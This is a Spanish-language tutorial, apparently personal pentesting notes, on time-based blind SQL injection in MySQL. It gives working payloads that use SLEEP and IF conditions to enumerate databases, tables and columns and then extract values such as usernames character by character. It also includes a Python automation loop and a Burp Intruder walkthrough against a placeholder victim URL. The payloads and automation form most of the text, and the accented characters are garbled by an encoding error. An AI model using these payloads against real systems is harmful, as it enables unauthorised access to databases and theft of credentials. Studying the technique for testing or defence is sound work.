# Blind SQL Injection - Time-Based ‚Äî Enumeraci√≥n completa y extracci√≥n de datos

Cuando una inyecci√≥n SQL no devuelve resultados visibles pero provoca **diferencias en el tiempo de respuesta**, usamos t√©cnicas **Time-Based Blind SQLi** para extraer datos de forma indirecta.

Consiste en usar funciones como `SLEEP(n)` y condicionales `IF(...)` para provocar un retraso si una condici√≥n es verdadera. Si el servidor se **retrasa varios segundos**, sabemos que la condici√≥n se cumpli√≥.

---

## üß© Paso 1: Extraer nombres de bases de datos

Se usa la siguiente consulta, car√°cter a car√°cter:

```sql
' AND IF(ASCII(SUBSTRING((SELECT schema_name FROM information_schema.schemata LIMIT N,1), pos, 1)) = X, SLEEP(5), 0) -- -
```

**Donde:**

- `N` es el √≠ndice de la base de datos (`0`, `1`, `2`, ...)
- `pos` es la posici√≥n del car√°cter dentro del nombre (`1`, `2`, `3`, ...)
- `X` es el c√≥digo ASCII que se prueba (`32` a `126`)

üîÅ Para extraer los nombres de bases de datos:
1. Se recorre `N` para ver cada base de datos (`LIMIT N,1`)
2. Se recorre `pos` desde 1 para cada car√°cter
3. Se prueba cada `X` del 32 al 126
4. Si el servidor **tarda 5 segundos**, el car√°cter es correcto

---

## üèóÔ∏è Paso 2: Extraer nombres de tablas de una base de datos

Para la base de datos `admin`, usamos:

```sql
' AND IF(ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='admin' LIMIT N,1), pos, 1)) = X, SLEEP(5), 0) -- -
```

---

## üß± Paso 3: Extraer nombres de columnas de una tabla

Para la tabla `users` en la base de datos `admin`:

```sql
' AND IF(ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema='admin' AND table_name='users' LIMIT N,1), pos, 1)) = X, SLEEP(5), 0) -- -
```

---

## üóÑÔ∏è Paso 4: Extraer datos de una columna

Ya que conocemos las columnas (`username`, `password`, etc.), ahora queremos los valores reales:

```sql
' AND IF(ASCII(SUBSTRING((SELECT username FROM admin.users LIMIT N,1), pos, 1)) = X, SLEEP(5), 0) -- -
```

üìå **Resumen de qu√© se est√° extrayendo:**

| Lo que se extrae           | Consulta usada dentro del `SUBSTRING(...)`                           |
|----------------------------|------------------------------------------------------------------------|
| Base de datos 2            | `(SELECT schema_name FROM information_schema.schemata LIMIT 1,1)`     |
| Tabla 3 de 'admin'         | `(SELECT table_name FROM information_schema.tables WHERE table_schema='admin' LIMIT 2,1)` |
| Columna 2 de 'users'       | `(SELECT column_name FROM information_schema.columns WHERE table_schema='admin' AND table_name='users' LIMIT 1,1)` |
| Dato de la columna         | `(SELECT username FROM admin.users LIMIT 0,1)`                        |

---

## üîÅ Ejemplo de iteraci√≥n en pseudoc√≥digo

```python
for N in range(0, total_filas):
    resultado = ""
    pos = 1
    while True:
        encontrado = False
        for X in range(32, 127):
            payload = f"' AND IF(ASCII(SUBSTRING((SELECT username FROM admin.users LIMIT {N},1), {pos}, 1)) = {X}, SLEEP(5), 0) -- -"
            if respuesta_tarda(payload):  # Funci√≥n que detecta si la respuesta tarda 5 segundos
                resultado += chr(X)
                pos += 1
                encontrado = True
                break
        if not encontrado:
            break
    print(f"[{N}] Resultado: {resultado}")
```

---

## üî¨ Ejemplo pr√°ctico en Burp Suite (Intruder)

### Supongamos esta URL vulnerable:

```
http://victima.com/perfil.php?id=1
```

### 1Ô∏è‚É£ Insertamos payload:

```
http://victima.com/perfil.php?id=1' AND IF(ASCII(SUBSTRING((SELECT username FROM admin.users LIMIT 0,1), 1, 1)) = ¬ßX¬ß, SLEEP(5), 0) -- -
```

### 2Ô∏è‚É£ En Intruder:

- Marca `¬ßX¬ß` como payload
- Tipo: N√∫mero, Rango del 32 al 126 (ASCII imprimible)
- Usa "Sniper" o "Pitchfork"
- En "Options" activa "Timeouts" y revisa el tiempo de respuesta

### 3Ô∏è‚É£ Observa:

- Si X = 97 y la respuesta tarda 5 segundos ‚Üí primer car√°cter es `'a'`
- Repite hasta tener el string completo

---

## ‚úÖ Resumen final

- El enfoque `Time-Based` es √∫til cuando no hay respuesta visible.
- Se basa en que el servidor **tarda si una condici√≥n es cierta**.
- Puedes extraer:
  - Bases de datos
  - Tablas
  - Columnas
  - **Y datos reales**
- Siempre se usa:
  - `IF(...)`
  - `SLEEP(n)`
  - `SUBSTRING(...)`
  - `ASCII(...)`
  - `LIMIT N,1` para iterar

---

Este m√©todo funciona en cualquier punto vulnerable de la URL o par√°metros (GET o POST), y puede automatizarse con scripts o herramientas como Burp Intruder, sqlmap (con `--technique=T`), etc.
